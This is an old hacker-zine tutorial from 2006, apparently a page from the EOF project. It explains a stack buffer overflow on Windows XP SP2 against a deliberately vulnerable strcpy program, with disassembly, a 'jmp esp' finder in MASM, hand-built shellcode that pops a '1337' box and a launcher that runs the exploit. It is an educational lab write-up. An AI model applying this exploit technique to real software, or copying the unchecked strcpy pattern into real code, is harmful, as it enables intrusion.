@@ -1,0 +1,277 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: Berniee,Fakedminded/EOF || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+                                   __________________________________ 
+                                  |OMG Another BufferOverflow Article|
+                                  |      [Tested on WinXP SP2]       |
+                                  |       fakedminded/berniee        |
+                                  |         [EOF-Project]            |
+                                  |__________________________________| 
+                                     
+
+
+
+.Contents:
+
+        -Inroduction
+        -Exploitable Programme
+        -Going Deeper with OllyDbg
+        -Exploit
+        -Finding 'jmp esp'
+        -Creating ShellCode
+        -Preforming the exploit
+        -Outro
+        
+.Introduction:
+
+Buffer overflow :is a programming error which may result in a memory access exception and program termination, 
+or in the event of the user being malicious, a breach of system security. --Wikipedia
+
+In this article I will introduce an explanation on how buffer overflows work by making
+an exploitable code through using c++ strcpy() function .
+And then exploit the strcpy() function to run our shellcode.
+
+things you need :
+-Pelles C --Cos the following example are tested by using that compiler (2.90.8 version)
+-OllyDbg  --To trace your code while being exploited
+-Masm32   --I use it to run the exploit and for finding 'jmp esp' in ntdll.dll [see Finding 'jmp esp']
+
+.Exploitable programme
+To make an exploitable programme I compiled the following c++ code :
+
+//-------------------C++ - code(sample.c)
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, const char** argv)
+{
+	char buffer[10];
+	strcpy(buffer,argv[1]);
+	 
+        return 0;
+}
+
+//-------------------end of C++ - code
+
+The above code is simple and obvious I chose a small buffer for easy demonstration at least for me !!
+
+.Going Deeper with OllyDbg:
+
+Run OllyDbg to see our sample.exe code.
+The following from OllyDbg --dissassembled code part [notice the strcpy loop part
+at 00401012 - 00401018 ]
+
+;-------------------------------------------
+00401000  /$ 55             PUSH EBP
+00401001  |. 89E5           MOV EBP,ESP
+00401003  |. 83EC 0C        SUB ESP,0C
+00401006  |. 8D4D F6        LEA ECX,DWORD PTR SS:[EBP-A]
+00401009  |. 8B45 0C        MOV EAX,DWORD PTR SS:[EBP+C]
+0040100C  |. 8B50 04        MOV EDX,DWORD PTR DS:[EAX+4]
+0040100F  |. 51             PUSH ECX
+00401010  |. 29D1           SUB ECX,EDX
+00401012  |&gt; 8A02           /MOV AL,BYTE PTR DS:[EDX]
+00401014  |. 880411         |MOV BYTE PTR DS:[ECX+EDX],AL
+00401017  |. 42             |INC EDX
+00401018  |. 84C0           |TEST AL,AL
+0040101A  |.^75 F6          \JNZ SHORT sample.00401012
+0040101C  |. 58             POP EAX
+0040101D  |. 8D45 F6        LEA EAX,DWORD PTR SS:[EBP-A]
+00401020  |. 50             PUSH EAX                                 ; /Arg1
+00401021  |. E8 3A000000    CALL sample.00401060                     ; \sample.00401060 'printing the char part
+00401026  |. 59             POP ECX
+00401027  |. 31C0           XOR EAX,EAX
+00401029  |. 89EC           MOV ESP,EBP
+0040102B  |. 5D             POP EBP
+0040102C  \. C3             RETN                                     ;returning from main()
+;--------------------------------------------
+from the above code you can see that the loop will go on till it finds a zero byte(zero ended strings)
+yo end the loop :
+TEST AL,AL
+JNZ SHORT sample.00401012
+
+So if we give in the argv[1] more than 10 bytes as the buffer can take an error will arise.
+Since strcpy() uses Stack to copy the argv[1] any overflowed data will overwrite Stack data
+which one of them is pointer that has been pushed by 'call' to be popped by 'ret' to return 
+back to the code proceeding 'call' .
+
+.Exploit:
+
+After compiling sample.c run sample.exe like this(preferred under OllyDbg):
+sample.exe aaaaaaaaaccccddddffff
+see that the result(from using OllyDbg) will be is that ebp value will be overwritten with
+'cccc' or 63636363 and esp overwritten by 'dddd' or 64646464 so when the 'ret' opcode
+executed it will cause error cos it cant execute code at 6464646 address!!!
+
+NoTe:memorize well inorder to continue reading this article 'dddd' stands for esp overwritting
+     and 'cccc' for ebp overwritting,and 'ffff' or more f's for our shell code
+     
+What we need also is to redirect the exploited code to our shell code by
+overwritting esp with an address:
+-where 'jmp esp' resides
+-or where 'jmp ebp' resides
+I will take the first choice and leave the 'jmp ebp' thing in this article.
+NoTe: If you want a 'jmp ebp' then the 'cccc' shld contain a 'jmp' to the code
+following the 'dddd' ---[according to the above example]
+
+.Finding 'jmp esp' :
+
+Well to make esp pointing to an address containing 'jmp esp' I used the following code
+to seek 'jmp esp' in ntdll.dll :
+;---------------------
+.586
+.model flat,stdcall
+option casemap:none
+
+include \masm32\include\windows.inc
+include \masm32\include\user32.inc
+include \masm32\include\kernel32.inc
+
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\user32.lib
+
+
+.data
+kern db &quot;ntdll.dll&quot;,0
+string_ db &quot;hi .. how are you?&quot;,0
+string__ db &quot;jamp at %x&quot;,0
+
+.data?
+buffer db 256 dup(?)
+
+.code
+start:
+
+retrieving_jmp_esp:
+invoke LoadLibrary,offset kern
+cmp word ptr [eax],'ZM'
+jne exit
+push eax
+
+add eax,[eax+3ch]
+mov ecx,[eax+50h]
+mov eax,[esp]
+push ecx
+dec ecx
+find_esp:
+
+cmp word ptr [eax],0e4ffh ;'jmp esp'
+je found_
+inc eax
+loop find_esp
+
+exit:
+invoke MessageBox,0,offset buffer,offset string_,0
+invoke ExitProcess,0
+
+found_:
+pop edx
+xchg edx,ecx
+sub ecx,edx
+pop eax
+dec eax
+add eax,ecx
+invoke wsprintf,offset buffer,offset string__,eax
+invoke MessageBox,0,offset buffer,offset string_,0
+ret
+
+end start
+
+;--------------------end of code
+
+the above code will display a message box displaying the 'jmp esp' address.
+Then with that address you go and change it to string and dont forget the reverse memory
+ order ,e.g:
+7c941eed - ntdll.dll jmp esp [what appeared to me]
+so we take it and open any hex editor [I used hexplorer]
+and write ed-1e-94-7c 
+then copy that yielded string ,whicis now the replacement of 'dddd' [see above]
+so when the ret executed it will take us to 7c941eed where 'jmp esp' present
+and since ret will decrease esp by four so the 'jmp esp' will directly point to our 
+shell code which will follow the 'dddd' part ...
+
+.Creating Shell Code:
+
+Inorder to make one working shellcode for this example you shouldnt put a zero byte
+in your shell code so as not to have a cut in half shell code
+the shell code I created was so simple and just for testing putposes
+
+shell db 33h, 0C0h, 50h, 68h ,31h ,33h, 33h, 37h, 54h, 50h, 0B8h, 0D8h, 0Ah, 86h ,07Ch ,0FFh ,0D0h
+
+assembler code: ;for explanation
+xor eax, eax
+push eax
+push '7331'
+push esp
+push eax
+mov eax, 07C860AD8h        ;FatalAppExit() address under WinXP SP2
+call eax
+
+Change 0D8h, 0Ah, 86h ,07Ch according to the FatalAppExit() address under your system.
+Again put that code into hex-editor(anyone) and copy the resulted string or save it[see next].
+
+.Preforming the exploit:
+
+Either you run the sample.exe from ollydbg with arguments the first 10bytes[anything -char to view-]
+followed by any four bytes for [ebp overwritting] and next 4 bytes[for esp overwritting --'jmp esp'
+address that we got] then our shell code followed and run sample.exe and watch how it works!! 
+
+or you can create a code to launch all the shit as follows:
+
+;----------------------code
+.586
+.model flat,stdcall
+option casemap:none
+
+include \masm32\include\windows.inc
+include \masm32\include\user32.inc
+include \masm32\include\kernel32.inc
+
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\user32.lib
+
+
+.data
+shell db 33h, 0C0h, 50h, 68h ,31h ,33h, 33h, 37h, 54h, 50h, 0B8h, 0D8h, 0Ah, 86h ,07Ch ,0FFh ,0D0h
+file_name db &quot;sample.exe aaaaaaaaaacccc&quot;,0  
+
+.data?
+buffer db 256 dup(?)
+
+.code
+start:
+exploit:
+invoke lstrcat,offset buffer,offset file_name
+mov edi,offset buffer
+add edi,sizeof file_name-1
+mov dword ptr [edi],07c941eedh
+add edi,4
+mov ecx,17                                      ;shell ocde lenght 17 bytes
+mov esi,offset shell
+rep movsb
+invoke WinExec,offset buffer,0
+
+exit:
+invoke MessageBox,0,offset buffer,0,0
+invoke ExitProcess,0
+end start
+
+;--------------------------end of code
+
+After assembling the above code and excuting it FatalAppExit() message box will popup with a word '1337' :)
+which is running from exploited sample.exe .
+
+
+.Outro:
+
+I hope the above explanation did explain to you or even gave you an idea about buffer oveflow
+(overrun) exploiting method.
+Although the example was simple , for exploiting larger codes it will need more patience
+and brain burned calories and luck!! .
+
+-----------------------------------------------------------------------
+|| berniee/fakedminded[EOF-Project.net] || Sept.2006 || ass-koder.de.vu
+</pre></body></html>
